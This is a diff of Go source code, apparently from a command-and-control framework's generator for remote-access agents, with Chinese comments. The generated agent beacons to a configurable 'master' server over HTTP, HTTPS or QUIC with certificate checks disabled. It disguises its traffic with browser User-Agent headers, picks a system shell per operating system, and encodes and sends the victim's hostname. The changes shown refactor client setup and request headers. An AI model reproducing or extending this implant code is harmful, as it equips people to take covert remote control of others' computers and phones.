@@ -10,7 +10,7 @@ func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
     if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || Username == "" || uid == "" || hostname == "" || keyPart == "" || filekey == "" || code == "" || base_rounds == "" {
         return "parameter null"
     }
-    var os_str, main_str, sys_str, tls_str,package_str,send,inithttp,prototime,protocol_var,protocol_var1,header string
+    var os_str, main_str, sys_str, tls_str,package_str,send,inithttp,prototime,protocol_var,header string
 	if protocol == "https" {
 		tls_str = `"crypto/tls"`
 	}else if protocol == "quic"{
@@ -370,8 +370,7 @@ func send() { //发送头部信息
     }
     if protocol == "quic"{
         inithttp = `
-        func initHttpClient() {
-            transport = &http3.Transport{
+           var transport = &http3.Transport{
                 TLSClientConfig: &tls.Config{
                     InsecureSkipVerify: true,
                     MinVersion:tls.VersionTLS13,
@@ -381,17 +380,14 @@ func send() { //发送头部信息
 					KeepAlivePeriod: 0,
                 },
             }
-            client = &http.Client{
+           var client = &http.Client{
                 Transport: transport,
                 Timeout:   30 * time.Second,
             }
-        }
         `
-        protocol_var1 = "transport *http3.Transport"
     }else if protocol == "http"{
         inithttp = `
-        func initHttpClient() {
-            transport = &http.Transport{
+           var transport = &http.Transport{
                 MaxConnsPerHost:     1,
                 MaxIdleConns:        1,
                 MaxIdleConnsPerHost: 1,
@@ -401,17 +397,14 @@ func send() { //发送头部信息
                     KeepAlive: 30 * time.Second,
                 }).DialContext,
             }
-            client = &http.Client{
+           var client = &http.Client{
                 Transport: transport,
                 Timeout:   30 * time.Second,
             }
-        }
         `
-        protocol_var1 = "transport *http.Transport"
     }else if protocol == "https"{
         inithttp = `
-	    func initHttpClient() {
-	        transport = &http.Transport{
+	       var transport = &http.Transport{
 	            MaxConnsPerHost:     1,
 	            MaxIdleConns:        1,
 	            MaxIdleConnsPerHost: 1,
@@ -425,13 +418,11 @@ func send() { //发送头部信息
 	                InsecureSkipVerify: true,
 	            },
 	        }
-	        client = &http.Client{
+	       var client = &http.Client{
 	            Transport: transport,
 	            Timeout:   30 * time.Second,
 	        }
-	    }
         `
-        protocol_var1 = "transport *http.Transport"
     }
     if protocol == "quic" {
         prototime = `
@@ -456,13 +447,13 @@ func send() { //发送头部信息
         protocol_var = "\"https://\""
         header = `
         get_headers map[string]string = map[string]string{"Accept": "text/html,application/xhtml+xml","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",}
-        post_headers map[string]string = map[string]string{"Content-Type": "application/json","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",}
+        post_headers map[string]string = map[string]string{"Content-Type": "application/x-www-form-urlencoded","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",}
         `
     }else{
         protocol_var = "\""+protocol + "://\""
         header = `
         get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
-        post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
+        post_headers map[string]string= map[string]string{"Content-Type":"application/x-www-form-urlencoded","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
         `
     }
     s_server := "\""+server+"\""
@@ -510,11 +501,9 @@ func send() { //发送头部信息
         master string = /*server*/
         key []byte
         /*header*/
-        /*protocol_var1*/
-        client *http.Client
     )
-    /*main_str*/
     /*inithttp*/
+    /*main_str*/
     func getUrl(url string) string {
         for {
             req, err := http.NewRequest("GET", url, nil)
@@ -560,11 +549,8 @@ func send() { //发送头部信息
                 time.Sleep(time.Duration(waitTime) * time.Second)
                 continue
             }
-            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
             for key, value := range post_headers {
-                if key != "Content-Type" {
-                    req.Header.Set(key, value)
-                }
+                req.Header.Set(key, value)
             }
             resp, err := client.Do(req)
             if err != nil {
@@ -1303,7 +1289,6 @@ func send() { //发送头部信息
             a_Mutex.Lock();decodeMap = buildDecodeMap();a_Mutex.Unlock()
             if uid == "" {uid = generateUUID()}
             key = nil
-            initHttpClient()
             if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
             clientname,_ = os.Hostname()
             client_b := customBase64Encode([]byte(clientname))
@@ -1349,7 +1334,6 @@ func send() { //发送头部信息
         `/\*send\*/`:             send,
         `/\*inithttp\*/`:         inithttp,   
         `/\*prototime\*/`:         prototime,
-        `/\*protocol_var1\*/`:    protocol_var1,
         `/\*header\*/`:           header,
 	}
     //先将code中的关键词进行替换
